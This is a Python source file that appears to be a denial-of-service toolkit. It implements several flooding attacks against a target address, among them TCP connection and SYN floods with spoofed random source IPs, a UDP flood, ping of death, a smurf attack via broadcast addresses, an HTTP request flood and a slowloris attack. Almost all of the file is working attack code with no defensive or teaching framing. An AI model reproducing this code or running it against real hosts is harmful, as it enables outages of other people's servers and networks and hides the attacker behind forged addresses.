import time, random, ipaddress, socket, os, threading, string
from inet.layers import Types, Packet, send, Ethernet, IP, TCP, ICMP, Raw

DETECTION_IP_LIMIT = 15
ICMP_SOCKET_PROTO = socket.getprotobyname("icmp")

##############
# Utils
##############
def __generate_ip_address():
    str(random.randint(1, 254))
    return "{}.{}.{}.{}".format(str(random.randint(1, 254)), str(random.randint(1, 254)),
                                str(random.randint(1, 254)), str(random.randint(1, 254)))

def __get_broadcast_address(ip):
    mask = '255.255.0.0'
    return ipaddress.IPv4Network(ip + '/' + mask, False).broadcast_address

def get_url_ip(url):
    clean_url = str(url.replace("https://", "").replace("http://", "").replace("www.", ""))
    return socket.gethostbyname(clean_url)


##############
# TCP attacks
##############
class ThreadCounter:
    def __init__(self, limit):
        self.limit = limit
        self.counter = 0
        self.errors = 0

    def increase(self):
        self.counter += 1

    def decrease(self):
        if self.counter - 1 >= 0:
            self.counter -= 1

    def available(self):
        return self.counter < self.limit

def __tcp_flood_thread(dest_ip, port, counter, locker):
    """ Sends connection request """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((dest_ip, port))
        locker.acquire()
        counter.decrease()
        locker.release()
        sock.close()
    except:
        counter.errors += 1

def tcp_flood_attack(target_ip, port, timeout=None):
    """ Floods a TCP server with connection requests (handshakes) """
    start_time = time.time()
    counter = ThreadCounter(100)
    locker = threading.Lock()
    while True:
        if timeout and time.time() - start_time >= timeout:
            break
        if counter.available():
            counter.increase()
            thread = threading.Thread(target=__tcp_flood_thread, args=(target_ip, port, counter, locker))
            thread.daemon = True
            thread.start()
        if counter.errors > 5:
            return False
    return True

def syn_flood_attack(victim_ip, port, timeout=None):
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        sock.bind(("enp0s3", 0))
        start_time = time.time()
        while True:
            if timeout and time.time() - start_time >= timeout:
                break
            eth = Ethernet()
            iplayer = IP(src_ip=__generate_ip_address(), dest_ip=victim_ip, protocol=Types.Proto_codes.TCP)
            tcp = TCP(src_port=random.randint(36000,65000), dest_port=port, sequence=12345, syn=1)
            iplayer.total_length = 40
            packet = Packet()
            packet.add_layers((eth, iplayer, tcp))
            send(packet)
        return True
    except:
        return False


##############
# UDP attacks
##############

def udp_flood_attack(victim_ip, port, timeout=None):
    """ Floods A UDP server with income data"""
    try:
        connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = os.urandom(1024)
        start_time = time.time()
        while True:
            if timeout and time.time() - start_time >= timeout:
                break
            connection.sendto(data, (victim_ip, port))

        connection.close()

        return True
    except:
        return False


###############
# ICMP attacks
###############

def send_icmp_packet(src_ip, victim_ip, payload):
    """ Sends an ICMP packet with ping request to a target"""
    ethernet = Ethernet()
    iplayer = IP(src_ip=src_ip, dest_ip=victim_ip, protocol=Types.Proto_codes.ICMP)
    icmp = ICMP(data=payload)
    iplayer.total_length = 20 + len(icmp.pack())
    packet = Packet()
    packet.add_layers((ethernet, iplayer, icmp))
    send(packet)

def __ping_thread(target_ip, sock):
    """ Sends ping request to a server"""
    payload = bytes(("X" * 65000).encode())
    sock.sendto(payload, (target_ip, 1))

def ping_of_death(victim_ip, use_thread=False, timeout=None):
    """ Floods a target with ping requests with an excessive size of payload """
    start_time = time.time()
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, ICMP_SOCKET_PROTO)
    while True:
        if timeout and time.time() - start_time >= timeout:
            break
        if use_thread:
            t = threading.Thread(target=__ping_thread, args=(victim_ip,sock,))
            t.daemon = True
            t.start()
        else:
            __ping_thread(victim_ip,sock)
    sock.close()

def smurf_attack(victim_ip, timeout=None):
    """ Floods a target with ping requests from multiple sources """
    addresses = [str(__get_broadcast_address(__generate_ip_address())) for _ in range(100)]
    start_time = time.time()
    while True:
        if timeout and time.time() - start_time >= timeout:
            break
        for ip in addresses:
            send_icmp_packet(ip, victim_ip, "X")


################
# HTTP attacks
################

def __send_http_request(target_ip, port):
    """ Sends a request to a HTTP server"""
    url = str(string.ascii_letters + string.digits + string.punctuation)
    url = "".join(random.sample(url, 5))
    get_request = "GET /%s HTTP/1.1\nHost: %s\n\n" % (url, socket.gethostname())
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        connection.connect((target_ip, port))
        connection.send(get_request.encode())
    except socket.error:
        raise Exception("Connection is lost")
    finally:
        connection.shutdown(socket.SHUT_RDWR)
        connection.close()

def http_flood_attack(target_ip, port, timeout=None, requests_number=None):
    """ Floods a HTTP server with requests"""
    start_time = time.time()
    requests_counter = 0
    try:
        while True:
            if (timeout and time.time() - start_time >= timeout) or \
                    (requests_number and requests_counter >= requests_number):
                break
            t = threading.Thread(target=__send_http_request, args=(target_ip, port,))
            t.start()
            t.join()
            time.sleep(0.01)
        return True
    except:
        return False

__headers = [
    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Accept-language: en-US,en"
]

def __setup_socket(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print ("connecting...")
    #sock.settimeout(4)
    try:
        sock.connect((ip, port))
        sock.sendall("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))

        for header in __headers:
            sock.send("{}\r\n".format(header).encode("utf-8"))

        return sock
    except Exception as e:
        print (e)
        pass

def slowloris_attack(target_ip, port, total_requests, timeout=None):
    sockets_list = [__setup_socket(target_ip, port) for _ in range(total_requests)]
    start_time = time.time()
    while True:
        if timeout and time.time() - start_time >= timeout:
            break
        for socket_item in sockets_list:
            try:
                socket_item.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
            except socket.error:
                sockets_list.remove(socket_item)
        for _ in range(total_requests - len(sockets_list)):
            try:
                sock = __setup_socket(target_ip, port)
                if sock:
                    sockets_list.append(sock)
            except socket.error:
                break
